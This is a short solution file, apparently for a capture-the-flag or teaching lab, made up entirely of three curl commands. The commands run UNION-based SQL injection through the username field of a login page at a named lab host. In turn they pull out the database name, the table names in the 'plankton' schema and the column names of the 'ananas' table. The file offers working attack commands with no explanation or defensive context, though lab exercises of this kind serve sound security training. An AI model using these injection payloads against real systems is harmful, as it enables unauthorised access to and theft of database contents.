"""
solution :

get database name
    curl -X POST http://hlabs.helb-prigogine.be:6543/plankton.php -d "username=' UNION SELECT DATABASE() -- &password=dummy"

get table name
    curl -X POST http://hlabs.helb-prigogine.be:6543/plankton.php -d "username=' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'plankton' -- &password=dummy"

get column name
    curl -X POST http://hlabs.helb-prigogine.be:6543/plankton.php -d "username=' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'ananas' -- &password=dummy"


"""